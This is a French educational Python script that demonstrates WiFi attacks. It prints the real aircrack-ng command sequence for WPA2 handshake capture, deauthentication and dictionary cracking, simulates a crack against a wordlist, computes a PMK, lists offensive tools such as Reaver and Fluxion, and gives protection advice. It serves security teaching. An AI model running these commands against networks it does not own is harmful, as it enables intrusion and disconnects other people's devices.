#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              WIFI CRACKER - DÉMONSTRATION ÉDUCATIVE              ║
║                                                                  ║
║  ⚠️  USAGE ÉDUCATIF - NE PAS UTILISER SUR DES RÉSEAUX D'AUTRUI   ║
╚══════════════════════════════════════════════════════════════════╝
"""

import subprocess
import os
import time
import hashlib
import binascii

def explain_wifi_security():
    """Expliquer les différents types de sécurité WiFi"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              📡 TYPES DE SÉCURITÉ WIFI                           ║
╚══════════════════════════════════════════════════════════════════╝

┌─────────────┬───────────────────────────────────────────────────┐
│ Type        │ Sécurité                                          │
├─────────────┼───────────────────────────────────────────────────┤
│ OPEN        │ ❌ Aucune - Trafic visible par tous               │
│ WEP         │ ❌ Cassé en minutes - N'utilisez JAMAIS           │
│ WPA         │ ⚠️  Vulnérable - Utilisez WPA2 minimum            │
│ WPA2-PSK    │ ✅ Sécurisé si mot de passe fort                  │
│ WPA2-Enterprise│ ✅✅ Très sécurisé (certificats)               │
│ WPA3        │ ✅✅✅ Le plus sécurisé actuellement              │
└─────────────┴───────────────────────────────────────────────────┘

🔓 COMMENT LES HACKERS CASSENT LE WIFI:

1. WEP (ancien, vulnérable):
   - Collecte de paquets IVs
   - Crack avec aircrack-ng en ~5 minutes
   
2. WPA/WPA2:
   - Capture du handshake (4-way)
   - Attaque dictionnaire/brute force
   - Temps: dépend de la complexité du mot de passe
   
3. WPS (Wi-Fi Protected Setup):
   - PIN de 8 chiffres (seulement 11000 combinaisons)
   - Reaver/Bully peuvent le craquer en heures
   - DÉSACTIVEZ WPS sur votre routeur!
    """)

def simulate_handshake_capture():
    """Simuler la capture d'un handshake"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              🤝 SIMULATION: CAPTURE HANDSHAKE WPA2               ║
╚══════════════════════════════════════════════════════════════════╝

📋 ÉTAPES D'UNE VRAIE ATTAQUE:

1. 📡 Passer la carte WiFi en mode monitor:
   └─→ airmon-ng start wlan0
   
2. 🔍 Scanner les réseaux:
   └─→ airodump-ng wlan0mon
   
   Résultat:
   ┌─────────────────────────────────────────────────────────────┐
   │ BSSID              PWR  CH  ENC   ESSID                     │
   ├─────────────────────────────────────────────────────────────┤
   │ AA:BB:CC:DD:EE:FF  -42  6   WPA2  MaisonWiFi               │
   │ 11:22:33:44:55:66  -65  11  WPA2  Livebox-1234             │
   │ FF:EE:DD:CC:BB:AA  -70  1   WEP   OldRouter                │
   └─────────────────────────────────────────────────────────────┘
   
3. 🎯 Cibler un réseau et capturer:
   └─→ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
   
4. ⚡ Forcer la déconnexion d'un client (deauth attack):
   └─→ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
   
   Le client se reconnecte → On capture le handshake!
   
5. 📦 Fichier capture.cap contient le handshake chiffré
    """)
    
    input("\n[Appuyez sur Entrée pour voir le cracking...]")
    
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              🔓 SIMULATION: CRACKING DU HANDSHAKE                ║
╚══════════════════════════════════════════════════════════════════╝

6. 💥 Attaque par dictionnaire:
   └─→ aircrack-ng -w wordlist.txt capture.cap
    """)
    
    # Simulation de cracking
    wordlist = [
        "password", "123456789", "qwerty123", "wifi2024",
        "internet", "maison123", "famille22", "monwifi!",
        "admin1234", "motdepasse", "12345678", "soleil2024"
    ]
    
    target_password = "soleil2024"
    
    print("\n   Démarrage de l'attaque...\n")
    
    for i, pwd in enumerate(wordlist, 1):
        # Animation
        print(f"\r   [{i:02d}/{len(wordlist)}] Test: {pwd:<20}", end="", flush=True)
        time.sleep(0.3)
        
        if pwd == target_password:
            print(f"\n\n   ✅ CLÉ TROUVÉE: {pwd}")
            print(f"   ⏱️  Tentatives: {i}")
            break
    
    print("""
   
═══════════════════════════════════════════════════════════════════
   
📊 TEMPS RÉEL DE CRACKING (GPU moderne):

   • Mot de passe 8 chiffres:     ~2 secondes
   • Mot de passe 8 lettres:      ~5 minutes  
   • Mot de passe 10 mixte:       ~5 jours
   • Mot de passe 12 complexe:    ~100+ années
   
🔑 Votre WiFi devrait avoir 12+ caractères avec lettres,
   chiffres et symboles pour être sécurisé!
    """)

def calculate_pmk():
    """Démontrer le calcul PMK (éducatif)"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              🔐 CALCUL PMK (Pairwise Master Key)                 ║
╚══════════════════════════════════════════════════════════════════╝

Le PMK est calculé à partir du mot de passe WiFi et du SSID.
C'est ce que les outils de cracking essaient de reconstruire.

Formule: PMK = PBKDF2(password, SSID, 4096, 256)
    """)
    
    ssid = input("\nEntrez un SSID (nom du WiFi): ").strip() or "MonWiFi"
    password = input("Entrez un mot de passe: ").strip() or "motdepasse123"
    
    print(f"\n📡 SSID: {ssid}")
    print(f"🔑 Password: {password}")
    print("\n⏳ Calcul du PMK (4096 itérations)...")
    
    # Calculer le PMK (PBKDF2-SHA1)
    pmk = hashlib.pbkdf2_hmac(
        'sha1',
        password.encode('utf-8'),
        ssid.encode('utf-8'),
        4096,
        32
    )
    
    pmk_hex = binascii.hexlify(pmk).decode()
    
    print(f"\n✅ PMK calculé:")
    print(f"   {pmk_hex}")
    print(f"\n   Ce PMK est comparé avec celui capturé dans le handshake.")
    print(f"   Si identique → Le mot de passe est correct!")

def show_protection_tips():
    """Conseils de protection"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              🛡️ COMMENT PROTÉGER VOTRE WIFI                      ║
╚══════════════════════════════════════════════════════════════════╝

✅ À FAIRE:
───────────────────────────────────────────────────────────────────
   1. Utiliser WPA3 si disponible (sinon WPA2)
   2. Mot de passe de 12+ caractères avec:
      - Majuscules et minuscules
      - Chiffres
      - Symboles (!@#$%^&*)
   3. Changer le mot de passe par défaut du routeur
   4. Désactiver WPS (Wi-Fi Protected Setup)
   5. Mettre à jour le firmware du routeur
   6. Cacher le SSID (optionnel, peu efficace)
   7. Activer le filtrage MAC (optionnel)
   8. Utiliser un VPN pour plus de sécurité

❌ À NE PAS FAIRE:
───────────────────────────────────────────────────────────────────
   • Utiliser WEP (crackable en minutes)
   • Mot de passe simple (nom, date, mots communs)
   • Laisser WPS activé
   • Garder admin/admin sur le routeur
   • Ignorer les mises à jour firmware

🔍 VÉRIFIER VOTRE SÉCURITÉ:
───────────────────────────────────────────────────────────────────
   1. Connectez-vous à 192.168.1.1 (ou 192.168.0.1)
   2. Vérifiez que WPA2/WPA3 est activé
   3. Vérifiez que WPS est désactivé
   4. Changez le mot de passe admin par défaut
    """)

def main():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              📡 WIFI CRACKER - DÉMONSTRATION                     ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Cette démo explique comment les hackers craquent le WiFi.       ║
║  Utilisez ces connaissances pour PROTÉGER votre réseau!          ║
║                                                                  ║
║  ⚠️ Scanner/attaquer un WiFi sans autorisation est ILLÉGAL!      ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    print("📋 OPTIONS:\n")
    print("   1. Comprendre les types de sécurité WiFi")
    print("   2. Simulation: Capture handshake + Cracking")
    print("   3. Calculer un PMK (démo technique)")
    print("   4. Comment protéger votre WiFi")
    print("   0. Quitter")
    
    choice = input("\n🎯 Votre choix: ").strip()
    
    if choice == "1":
        explain_wifi_security()
    elif choice == "2":
        simulate_handshake_capture()
    elif choice == "3":
        calculate_pmk()
    elif choice == "4":
        show_protection_tips()
    
    print("\n" + "=" * 60)
    print("🎓 OUTILS RÉELS UTILISÉS PAR LES PENTESTERS:")
    print("=" * 60)
    print("""
   • aircrack-ng   - Suite complète pour WiFi (Linux)
   • hashcat       - Cracking GPU ultra-rapide
   • Reaver/Bully  - Attaque WPS
   • Wifite        - Automatisation des attaques
   • Fluxion       - Phishing WiFi (Evil Twin)
   
   💡 Pour apprendre légalement: 
      - Créez votre propre réseau de test
      - Utilisez des VMs et lab isolés
      - Suivez des cours certifiés (CEH, OSCP)
    """)

if __name__ == "__main__":
    main()
